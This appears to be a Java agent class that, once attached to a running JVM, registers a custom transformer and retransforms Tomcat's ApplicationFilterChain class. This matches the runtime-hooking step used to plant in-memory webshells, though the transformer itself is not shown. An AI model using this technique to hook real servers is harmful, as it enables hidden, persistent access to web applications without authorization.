package com.loki.JavaAgent;

import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;

public class MyAgent {
    /*
    定义agentmain函数,传入Instrumentation,利用该对象
    1、遍历全部已加载的类获取关键类。
    2、对关键类调用retransformClasses方法。
     */
    public static void agentmain(String agentArgs, Instrumentation inst) throws UnmodifiableClassException {
        MyTransformer tf = new MyTransformer();//new my transformer
        inst.addTransformer(tf, true);//added
        Class[] allclass = inst.getAllLoadedClasses();//get all class load by ...
        for (Class cl : allclass) {
            if (cl.getName().equals("org.apache.catalina.core.ApplicationFilterChain"))//for Tomcat
            {
                inst.retransformClasses(cl);
                System.out.println("调用inst.retransformClasses:" + cl.getName());
            }
        }
    }
}

